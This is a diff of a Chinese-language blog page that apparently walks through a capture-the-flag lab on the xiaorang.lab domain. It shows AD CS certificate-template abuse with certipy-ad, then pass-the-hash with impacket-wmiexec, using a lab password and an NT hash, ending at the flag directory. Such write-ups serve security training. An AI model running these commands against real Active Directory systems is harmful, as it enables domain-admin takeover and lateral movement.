@@ -18,8 +18,9 @@
 <meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219011122478.png">
 <meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219011943367.png">
 <meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219164251158.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219165940020.png">
 <meta property="article:published_time" content="2026-02-18T14:12:02.000Z">
-<meta property="article:modified_time" content="2026-02-19T08:51:28.976Z">
+<meta property="article:modified_time" content="2026-02-19T09:06:17.682Z">
 <meta property="article:author" content="Rufeii">
 <meta property="article:tag" content="log4j2">
 <meta property="article:tag" content="SMB协议">
@@ -230,13 +231,17 @@
 <p>核心逻辑就是利用配置不当的模板，“合情合理”地通过 AD CS 申请出一张属于“域管理员”的身份证（证书）。然后再去请求TGT票据，通常我们通过 AS-REQ 请求 TGT 时需要用户 Hash。但当引入 ADCS 证书服务后，Windows 支持一种名为 PKINIT，PKINIT 是 Kerberos 协议的一个扩展，它允许用户使用数字证书（公私钥对）而不是对称密钥（密码 Hash）来进行初始身份验证（Pre-Authentication）</p>
 <p>攻击步骤：</p>
 <ol>
-<li><p>查看证书模板：proxychains4 -q certipy-ad find -u ‘<a href="mailto:&#x7a;&#x68;&#97;&#110;&#x67;&#x78;&#x69;&#97;&#x40;&#x78;&#x69;&#97;&#111;&#x72;&#x61;&#x6e;&#x67;&#46;&#108;&#x61;&#98;">&#x7a;&#x68;&#97;&#110;&#x67;&#x78;&#x69;&#97;&#x40;&#x78;&#x69;&#97;&#111;&#x72;&#x61;&#x6e;&#x67;&#46;&#108;&#x61;&#98;</a>‘  -password ‘MyPass2@@6’ -dc-ip 172.22.9.7 -vulnerable -stdout</p>
+<li><p>查看证书模板：proxychains4 -q certipy-ad find -u ‘<a href="mailto:&#122;&#104;&#97;&#x6e;&#x67;&#x78;&#105;&#x61;&#64;&#x78;&#105;&#x61;&#111;&#114;&#x61;&#x6e;&#103;&#x2e;&#108;&#97;&#98;">&#122;&#104;&#97;&#x6e;&#x67;&#x78;&#105;&#x61;&#64;&#x78;&#105;&#x61;&#111;&#114;&#x61;&#x6e;&#103;&#x2e;&#108;&#97;&#98;</a>‘  -password ‘MyPass2@@6’ -dc-ip 172.22.9.7 -vulnerable -stdout</p>
 </li>
-<li><p>请求域管证书：proxychains certipy-ad req -u ‘<a href="mailto:&#122;&#x68;&#97;&#110;&#x67;&#x78;&#x69;&#x61;&#64;&#120;&#105;&#97;&#111;&#114;&#x61;&#x6e;&#x67;&#46;&#108;&#97;&#x62;">&#122;&#x68;&#97;&#110;&#x67;&#x78;&#x69;&#x61;&#64;&#120;&#105;&#97;&#111;&#114;&#x61;&#x6e;&#x67;&#46;&#108;&#97;&#x62;</a>‘ -p ‘MyPass2@@6’ -target 172.22.9.7 -dc-ip 172.22.9.7 -ca ‘xiaorang-XIAORANG-DC-CA’ -template ‘XR Manager’ -upn ‘<a href="mailto:&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#x74;&#114;&#x61;&#116;&#111;&#114;&#64;&#x78;&#105;&#x61;&#111;&#x72;&#x61;&#x6e;&#x67;&#46;&#x6c;&#97;&#x62;">&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#x74;&#114;&#x61;&#116;&#111;&#114;&#64;&#x78;&#105;&#x61;&#111;&#x72;&#x61;&#x6e;&#x67;&#46;&#x6c;&#97;&#x62;</a>‘</p>
+<li><p>请求域管证书：proxychains certipy-ad req -u ‘<a href="mailto:&#122;&#x68;&#x61;&#x6e;&#103;&#x78;&#105;&#x61;&#64;&#x78;&#105;&#97;&#x6f;&#114;&#x61;&#x6e;&#x67;&#x2e;&#x6c;&#x61;&#98;">&#122;&#x68;&#x61;&#x6e;&#103;&#x78;&#105;&#x61;&#64;&#x78;&#105;&#97;&#x6f;&#114;&#x61;&#x6e;&#x67;&#x2e;&#x6c;&#x61;&#98;</a>‘ -p ‘MyPass2@@6’ -target 172.22.9.7 -dc-ip 172.22.9.7 -ca ‘xiaorang-XIAORANG-DC-CA’ -template ‘XR Manager’ -upn ‘<a href="mailto:&#x61;&#100;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#x72;&#64;&#120;&#x69;&#97;&#111;&#114;&#x61;&#x6e;&#x67;&#46;&#x6c;&#97;&#x62;">&#x61;&#100;&#109;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#x72;&#64;&#120;&#x69;&#97;&#111;&#114;&#x61;&#x6e;&#x67;&#46;&#x6c;&#97;&#x62;</a>‘</p>
 </li>
 <li><p>请求TGT：proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</p>
 </li>
 </ol>
+<p><img src="/../images/achieve/2026/1/image-20260219165940020.png" alt="image-20260219165940020"></p>
+<p>这里就可以返回管理员的hash，于是我们直接PTH即可</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk</span><br><span class="line"></span><br><span class="line">proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/Administrator@172.22.9.26 -codec gbk</span><br><span class="line"></span><br><span class="line">cd Users<span class="keyword">\Administrator</span><span class="keyword">\flag</span></span><br></pre></td></tr></table></figure>
+
 
   </div>
 </article>
